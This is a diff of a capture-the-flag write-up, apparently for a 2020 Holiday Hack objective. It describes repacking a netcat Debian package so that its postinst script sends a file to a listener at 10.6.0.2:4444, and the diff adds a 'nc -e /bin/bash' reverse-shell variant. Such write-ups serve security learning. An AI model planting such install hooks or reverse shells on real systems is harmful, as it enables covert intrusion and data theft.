@@ -36,7 +36,11 @@ A Node.js HTTP server was started `python3 -m http.server 80` and it logged the 
 On the device the Debian package `netcat-traditional_1.10-41.1ubuntu1_amd64.deb` was found.
 This package was modified to include this line in the postinst script:
 
-    /bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt
+`/bin/nc 10.6.0.2 4444 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`
+
+By opting for 
+    /bin/nc 10.6.0.2 4444 -e /bin/bash
+an interactive reverse shell can be acquired.
 ```
 guest@faf32a4d4929:~/debs$ mkdir tmp
 guest@faf32a4d4929:~/debs$ dpkg-deb -R netcat-traditional_1.10-41.1ubuntu1_amd64.deb tmp
@@ -52,8 +56,8 @@ That way the remote device would download this package and install it. In course
 to receive the [text](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-9/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt).
 In this file it can be found that **Tanta Kringle** recused herself from the vote.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTA5Mjc4NTMyMSwtMjA2MjY3NTI5NywtNj
-EyODk3Nzk5LC04NTI3MjI3MDMsMTc1ODI0MzY3NywxNjM0Mzk0
-OTQxLDEyMDQ0MjY1MzksLTE3OTg0MTU4OTYsLTg3ODM5MjIxNi
-w1MTQyMDkxNTldfQ==
+eyJoaXN0b3J5IjpbNzA4NDA2MDkwLDEwOTI3ODUzMjEsLTIwNj
+I2NzUyOTcsLTYxMjg5Nzc5OSwtODUyNzIyNzAzLDE3NTgyNDM2
+NzcsMTYzNDM5NDk0MSwxMjA0NDI2NTM5LC0xNzk4NDE1ODk2LC
+04NzgzOTIyMTYsNTE0MjA5MTU5XX0=
 -->
